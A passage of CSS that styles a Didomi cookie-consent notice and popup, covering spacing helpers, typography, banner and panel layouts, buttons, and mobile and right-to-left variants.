      margin-right: -4px
    }

    #didomi-host .pull-right-none {
      margin-right: 0
    }

    #didomi-host .push {
      margin: 16px
    }

    #didomi-host .push-xxl {
      margin: 56px
    }

    #didomi-host .push-xl {
      margin: 48px
    }

    #didomi-host .push-lg {
      margin: 32px
    }

    #didomi-host .push-md {
      margin: 24px
    }

    #didomi-host .push-sm {
      margin: 8px
    }

    #didomi-host .push-xs {
      margin: 4px
    }

    #didomi-host .push-none {
      margin: 0
    }

    #didomi-host .push-bottom {
      margin-bottom: 16px
    }

    #didomi-host .push-bottom-xxl {
      margin-bottom: 56px
    }

    #didomi-host .push-bottom-xl {
      margin-bottom: 48px
    }

    #didomi-host .push-bottom-lg {
      margin-bottom: 32px
    }

    #didomi-host .push-bottom-md {
      margin-bottom: 24px
    }

    #didomi-host .push-bottom-sm {
      margin-bottom: 8px
    }

    #didomi-host .push-bottom-xs {
      margin-bottom: 4px
    }

    #didomi-host .push-bottom-none {
      margin-bottom: 0
    }

    #didomi-host .push-top {
      margin-top: 16px
    }

    #didomi-host .push-top-xxl {
      margin-top: 56px
    }

    #didomi-host .push-top-xl {
      margin-top: 48px
    }

    #didomi-host .push-top-lg {
      margin-top: 32px
    }

    #didomi-host .push-top-md {
      margin-top: 24px
    }

    #didomi-host .push-top-sm {
      margin-top: 8px
    }

    #didomi-host .push-top-xs {
      margin-top: 4px
    }

    #didomi-host .push-top-none {
      margin-top: 0
    }

    #didomi-host .push-left {
      margin-left: 16px
    }

    #didomi-host .push-left-xxl {
      margin-left: 56px
    }

    #didomi-host .push-left-xl {
      margin-left: 48px
    }

    #didomi-host .push-left-lg {
      margin-left: 32px
    }

    #didomi-host .push-left-md {
      margin-left: 24px
    }

    #didomi-host .push-left-sm {
      margin-left: 8px
    }

    #didomi-host .push-left-xs {
      margin-left: 4px
    }

    #didomi-host .push-left-none {
      margin-left: 0
    }

    #didomi-host .push-right {
      margin-right: 16px
    }

    #didomi-host .push-right-xxl {
      margin-right: 56px
    }

    #didomi-host .push-right-xl {
      margin-right: 48px
    }

    #didomi-host .push-right-lg {
      margin-right: 32px
    }

    #didomi-host .push-right-md {
      margin-right: 24px
    }

    #didomi-host .push-right-sm {
      margin-right: 8px
    }

    #didomi-host .push-right-xs {
      margin-right: 4px
    }

    #didomi-host .push-right-none {
      margin-right: 0
    }

    #didomi-host a,
    #didomi-host p,
    #didomi-host span {
      font-size: inherit;
      color: inherit;
      font-weight: inherit;
      line-height: inherit;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased
    }

    #didomi-host .didomi-icon {
      vertical-align: middle
    }

    #didomi-host .didomi-logo-icon {
      margin-left: 10px
    }

    #didomi-host div {
      display: block
    }

    #didomi-host p {
      display: block;
      margin-bottom: 16px
    }

    #didomi-host .p-title {
      font-weight: 700;
      font-size: 1.1em;
      display: block;
      letter-spacing: .005em
    }

    #didomi-host ul {
      display: block;
      margin-bottom: 16px
    }

    #didomi-host li {
      display: list-item;
      margin-left: 20px
    }

    #didomi-host ol {
      display: block;
      list-style-type: decimal;
      margin-bottom: 16px
    }

    #didomi-host table {
      box-sizing: border-box;
      display: table;
      width: 100%;
      max-width: 100%;
      border-collapse: separate;
      border-spacing: 2px
    }

    #didomi-host table tbody,
    #didomi-host table thead {
      display: table-header-group
    }

    #didomi-host table tr {
      display: table-row
    }

    #didomi-host table td,
    #didomi-host table th {
      display: table-cell
    }

    #didomi-host a {
      cursor: pointer
    }

    #didomi-host a.didomi-no-link-style {
      text-decoration: none;
      color: #000
    }

    #didomi-host style {
      display: none
    }

    #didomi-host .text-bold {
      font-weight: 700
    }

    #didomi-host h1 {
      font-size: 2em
    }

    #didomi-host h1,
    #didomi-host h2 {
      display: block;
      font-weight: 700;
      margin-bottom: 16px
    }

    #didomi-host h2 {
      font-size: 1.5em
    }

    #didomi-host h3 {
      font-size: 1.17em
    }

    #didomi-host h3,
    #didomi-host h4,
    #didomi-host h5 {
      display: block;
      font-weight: 700;
      margin-bottom: 16px
    }

    #didomi-host h5 {
      font-size: .83em
    }

    #didomi-host h6 {
      display: block;
      font-size: .67em;
      font-weight: 700;
      margin-bottom: 16px
    }

    #didomi-host b,
    #didomi-host strong {
      font-weight: 700
    }

    #didomi-host cite,
    #didomi-host dfn,
    #didomi-host em,
    #didomi-host i,
    #didomi-host var {
      font-style: italic
    }

    #didomi-host ins,
    #didomi-host u {
      text-decoration: underline
    }

    #didomi-host del,
    #didomi-host s,
    #didomi-host strike {
      text-decoration: line-through
    }

    #didomi-host sub {
      vertical-align: sub
    }

    #didomi-host sub,
    #didomi-host sup {
      font-size: smaller;
      line-height: normal
    }

    #didomi-host sup {
      vertical-align: super
    }

    #didomi-host nobr {
      white-space: nowrap
    }

    #didomi-host hr {
      display: block;
      border: 1px inset;
      margin: 16px 0;
      color: gray;
      box-sizing: content-box
    }

    #didomi-host :focus {
      outline: 1px auto #4d90fe
    }

    #didomi-host li[title] span,
    #didomi-host span[title] {
      cursor: help;
      border-bottom: 1px dashed #000
    }

    #didomi-host .hbb-safe-area {
      position: absolute;
      left: 128px;
      top: 36px;
      width: 1024px;
      height: 648px;
      background-color: rgba(0, 0, 0, .5)
    }

    #didomi-host [dataTooltip] {
      position: relative;
      width: fit-content;
      cursor: help;
      border-bottom: 1px dashed #000
    }

    #didomi-host [dataTooltip]:focus {
      outline: none !important
    }

    [dir=rtl] #didomi-host [dataTooltip]:after {
      text-align: right
    }

    #didomi-host [dataTooltip]:focus:after {
      content: attr(dataTooltip);
      padding: 5px;
      font-size: 10px;
      line-height: 12px;
      display: block;
      position: absolute;
      white-space: pre-line;
      text-align: left;
      background-color: #f1f0f1;
      border: 1px solid #ddd;
      overflow-y: auto !important;
      max-height: 80px;
      z-index: 1
    }

    #didomi-host .didomi-consent-popup-categories [dataTooltip],
    #didomi-host .didomi-consent-popup-categories [dataTooltip]:focus:after,
    #didomi-host .didomi-consent-popup-vendor__description [dataTooltip],
    #didomi-host .didomi-consent-popup-vendor__description [dataTooltip]:focus:after,
    #didomi-host .didomi-vendor-storage-disclosures [dataTooltip],
    #didomi-host .didomi-vendor-storage-disclosures [dataTooltip]:focus:after {
      position: static
    }

    #didomi-host .sr-only {
      border: 0 !important;
      clip: rect(1px, 1px, 1px, 1px) !important;
      -webkit-clip-path: inset(50%) !important;
      clip-path: inset(50%) !important;
      height: 1px !important;
      margin: -1px !important;
      overflow: hidden !important;
      padding: 0 !important;
      position: fixed !important;
      width: 1px !important;
      white-space: nowrap !important
    }

    #didomi-host .hidetooltip.hidetooltip.hidetooltip+[role=tooltip],
    #didomi-host [role=tooltip] {
      visibility: hidden;
      position: fixed
    }

    #didomi-host #buttons #didomi-notice-learn-more-button>span {
      white-space: normal
    }

    #didomi-host #didomi-notice {
      background-color: #fff
    }

    #didomi-host #didomi-notice p {
      margin: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice {
      position: fixed;
      font-size: 13px;
      line-height: 1.5em;
      z-index: 2147483640
    }

    #didomi-host #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
      margin-right: 40px
    }

    #didomi-host #didomi-notice.didomi-regular-notice a {
      color: inherit;
      text-decoration: underline
    }

    #didomi-host #didomi-notice.didomi-regular-notice .didomi-notice-view-partners-link,
    #didomi-host #didomi-notice.didomi-regular-notice .didomi-notice-view-partners-link-in-text {
      text-decoration: underline
    }

    #didomi-host #didomi-notice.didomi-regular-notice .didomi-buttons-with-x-button {
      margin-top: 36px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      padding: 32px;
      max-width: 310px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons {
      margin-top: 20px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.multiple,
    #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.single,
    #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.single button {
      width: 100%
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.multiple button {
      padding-right: .8em;
      width: 100%
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box.top.left {
      margin: 1em 0 0 1em
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box.top.right {
      margin: 1em 1em 0 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box.bottom.left {
      margin: 0 0 1em 1em
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-box.bottom.right {
      margin: 0 1em 1em 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-banner {
      padding: 1em 1.8em;
      left: 0;
      right: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-banner .didomi-notice__interior-border {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple {
      -ms-flex: 0 0 auto
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple button {
      margin-right: 10px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel {
      max-width: 600px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.right {
      right: 100px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.left {
      left: 100px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.bottom {
      padding: 1px;
      border-top-width: 1px;
      border-top-style: solid;
      border-right-width: 1px;
      border-right-style: solid;
      border-left-width: 1px;
      border-left-style: solid;
      border-top-left-radius: 5px;
      border-top-right-radius: 5px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.bottom .didomi-notice__interior-border {
      border-top-width: 1px;
      border-top-style: solid;
      border-right-width: 1px;
      border-right-style: solid;
      border-left-width: 1px;
      border-left-style: solid;
      border-top-left-radius: 3px;
      border-top-right-radius: 3px;
      padding: 10px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.top {
      padding: 1px;
      border-bottom-width: 1px;
      border-bottom-style: solid;
      border-right-width: 1px;
      border-right-style: solid;
      border-left-width: 1px;
      border-left-style: solid;
      border-bottom-left-radius: 5px;
      border-bottom-right-radius: 5px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.top .didomi-notice__interior-border {
      border-bottom-width: 1px;
      border-bottom-style: solid;
      border-right-width: 1px;
      border-right-style: solid;
      border-left-width: 1px;
      border-left-style: solid;
      border-bottom-left-radius: 3px;
      border-bottom-right-radius: 3px;
      padding: 10px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel #buttons.multiple {
      margin-top: 20px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.shape-panel #buttons.multiple button {
      margin-right: 10px
    }

    #didomi-host #didomi-notice.didomi-regular-notice.top {
      top: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.bottom {
      bottom: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.left {
      left: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice.right {
      right: 0
    }

    #didomi-host #didomi-notice.didomi-regular-notice #buttons {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: center;
      -moz-box-pack: center;
      -webkit-flex-pack: center;
      -ms-flex-pack: center;
      -moz-justify-content: center;
      -webkit-justify-content: center;
      justify-content: center;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center
    }

    #didomi-host #didomi-notice.didomi-regular-notice #buttons button {
      display: block;
      padding: .4em .8em;
      font-size: .9em;
      font-weight: 700;
      border-width: 1px;
      border-style: solid;
      text-align: center;
      white-space: nowrap;
      min-width: 140px;
      cursor: pointer;
      text-decoration: none
    }

    #didomi-host #didomi-notice.didomi-regular-notice #buttons button.didomi-button-standard {
      background-color: #eee;
      border: 1px solid rgba(34, 34, 34, .2);
      color: #555
    }

    #didomi-host #didomi-notice.didomi-regular-notice .didomi-x-button {
      right: 8px;
      top: 8px
    }

    [dir=rtl] #didomi-host #didomi-notice.didomi-regular-notice .didomi-x-button {
      right: auto;
      left: 8px
    }

    #didomi-host .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
      position: absolute;
      top: 10px !important;
      right: 35px !important
    }

    [dir=rtl] #didomi-host .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
      left: 35px;
      right: auto !important
    }

    #didomi-host .didomi-screen-large #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
      max-width: 1200px
    }

    #didomi-host .didomi-screen-xlarge #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
      max-width: 1500px
    }

    #didomi-host .didomi-mobile .didomi-notice-text-with-x-button {
      margin-left: 36px;
      margin-top: 36px
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height {
      box-sizing: border-box;
      height: auto;
      max-height: 100%;
      display: flex
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height.didomi-max-height-reached #buttons {
      box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, .1)
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border {
      padding: 0;
      width: 100%;
      flex: 1 0 auto;
      display: flex;
      max-height: 100vh;
      max-height: -webkit-fill-available
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border .didomi-notice-text {
      padding: 1em 1.8em;
      margin: 0;
      height: 100%;
      overflow-y: auto;
      box-sizing: border-box
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border .didomi-notice-text>:last-child {
      margin-bottom: 20px
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border #buttons {
      flex: 1 0 auto;
      box-sizing: border-box;
      padding: 1em 1.8em;
      margin-top: 0
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice {
      left: 0;
      right: 0;
      font-size: 11px;
      padding: 1px
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing {
      font-size: 12px
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
      margin-right: 0
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice .didomi-notice__interior-border {
      padding: 1em 1.8em;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.bottom,
    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.bottom .didomi-notice__interior-border {
      border-top-width: 1px;
      border-top-style: solid
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.top,
    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.top .didomi-notice__interior-border {
      border-bottom-width: 1px;
      border-bottom-style: solid
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #text {
      width: 100%
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons {
      margin-top: 20px
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple,
    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.single,
    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.single button {
      width: 100%
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple button {
      margin-right: 10px;
      padding-right: .8em;
      width: 100%
    }

    #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple button:last-child {
      margin-right: 0
    }

    #didomi-host .didomi-mobile .didomi-banner-notice-optin-type .didomi-banner-notice-continue-without-agreeing-buttons {
      width: 100%
    }

    #didomi-host .didomi-mobile .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
      align-self: flex-end;
      position: static;
      margin-top: 5px;
      margin-bottom: 15px
    }

    #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple {
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column
    }

    #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple button {
      margin-bottom: 10px;
      margin-right: 0;
      padding-right: 0;
      width: 100%
    }

    #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple button:last-child {
      margin-bottom: 0
    }

    #didomi-host .didomi-popup__backdrop {
      z-index: 2147483641
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup .didomi-popup-view {
      width: 100%
    }

    #didomi-host .didomi-popup__backdrop.didomi-popup-with-x-button {
      padding-top: 18px
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height {
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: center;
      -ms-flex-direction: column;
      height: 100%;
      max-height: 100vh
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-exterior-border,
    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-popup-container {
      border-radius: 0
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-popup-notice-logo-container {
      box-shadow: 0 3px 10px -2px rgba(0, 0, 0, .1)
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached #buttons {
      box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, .1)
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border {
      display: inherit;
      box-sizing: border-box;
      margin: 0 auto;
      z-index: 2147483641;
      padding: 0 !important;
      max-height: 100%;
      display: flex
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container {
      flex: 1 0 auto;
      max-width: 700px;
      display: flex;
      box-sizing: border-box;
      margin: 0 auto;
      padding: 0 !important
    }

    @media (-ms-high-contrast:none) {

      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view,
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container ::-ms-backdrop {
        height: auto !important;
        overflow-y: auto
      }

      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-exterior-border,
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container ::-ms-backdrop {
        display: block !important
      }
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view {
      max-height: 100vh;
      height: 100%;
      height: fit-content;
      height: -webkit-fit-content;
      width: 100%;
      padding: 0;
      flex: 1 0 auto;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: start;
      -moz-box-pack: start;
      -webkit-flex-pack: start;
      -ms-flex-pack: start;
      -moz-justify-content: flex-start;
      -webkit-justify-content: flex-start;
      justify-content: flex-start
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view>:first-child {
      padding-top: 50px
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container {
      box-sizing: border-box;
      flex: 1 0 auto;
      z-index: 2147483640
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
      margin-bottom: 30px
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
      height: 100%;
      overflow-y: auto;
      padding: 0 50px;
      box-sizing: border-box
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container>:last-child {
      margin-bottom: 20px
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
      box-sizing: border-box;
      padding: 20px 25px 50px;
      margin-top: 0;
      flex: 1 0 auto
    }

    #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
      margin-top: 0 !important
    }

    @media (-ms-high-contrast:none) {

      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container,
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view ::-ms-backdrop {
        flex: 1 0 0
      }

      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons,
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view ::-ms-backdrop {
        flex: 1 0 0
      }
    }

    #didomi-host .didomi-popup-notice {
      position: relative;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      align-items: center;
      box-sizing: border-box;
      flex: 1;
      max-width: 600px;
      padding: 50px
    }

    #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing {
      padding: 45px 25px !important;
      color: #333
    }

    #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing h1 {
      text-align: left;
      margin-top: 0;
      margin-bottom: 25px
    }

    [dir=rtl] #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing h1 {
      text-align: right
    }

    #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing p {
      font-size: 14px;
      margin-top: 0;
      margin-bottom: 10px
    }

    #didomi-host .didomi-popup-notice.didomi-popup-notice-data-processing-list p span,
    #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing p span {
      font-size: 12px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-text p {
      margin: 0
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-text p span {
      font-size: 15px
    }

    #didomi-host .didomi-popup-notice h1 {
      text-align: center;
      margin-bottom: 50px
    }

    [dir=rtl] #didomi-host .didomi-popup-notice h1 {
      text-align: right
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-logo {
      width: 200px;
      margin-bottom: 30px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext,
    #didomi-host .didomi-popup-notice .didomi-popup-notice-text {
      max-width: 600px;
      width: 100%;
      flex: 0 auto;
      text-align: left
    }

    [dir=rtl] #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext,
    [dir=rtl] #didomi-host .didomi-popup-notice .didomi-popup-notice-text {
      text-align: right
    }

    #didomi-host .didomi-popup-notice .didomi-notice-view-partners-link {
      display: block;
      text-align: center;
      margin-top: 20px
    }

    #didomi-host .didomi-popup-notice .didomi-notice-view-partners-link-in-text {
      text-decoration: underline
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons {
      margin-top: 30px;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      justify-content: center;
      align-items: center
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-components-button {
      padding: 2px 25px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons a {
      text-decoration: underline
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button {
      min-width: 200px;
      margin-right: 10px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:last-child,
    [dir=rtl] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button {
      margin-right: 0
    }

    [dir=rtl] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:last-child,
    [dir=rtl] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:not(:last-child):not(:first-child) {
      margin-right: 10px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext {
      margin-top: 30px
    }

    #didomi-host .didomi-popup-notice .didomi-popup-close {
      position: absolute;
      right: 30px;
      top: 30px
    }

    #didomi-host .didomi-popup-notice-optin-type {
      max-width: 730px
    }

    #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-buttons {
      align-items: initial
    }

    #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-buttons .didomi-components-button {
      padding: 8px 16px !important;
      line-height: 140%;
      height: auto
    }

    #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-logo-container,
    #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-text-container {
      clear: both
    }

    #didomi-host .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
      float: right;
      margin-top: -10px;
      margin-bottom: 40px
    }

    [dir=rtl] #didomi-host .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
      float: left
    }

    #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice {
      padding: 30px;
      font-size: 12px;
      line-height: 160%
    }

    #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice h1 {
      margin-bottom: 35px
    }

    #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice p {
      text-align: justify
    }

    #didomi-host .didomi-mobile .didomi-popup-with-x-button {
      padding-top: 0
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height,
    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view {
      max-height: -webkit-fill-available
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view>:first-child {
      padding-top: 30px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
      margin-bottom: 30px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
      padding: 0 30px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container>:first-child {
      margin-top: 20px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container>:last-child {
      margin-bottom: 15px
    }

    #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container~.didomi-popup-notice-logo-container {
      padding: 0 30px
    }

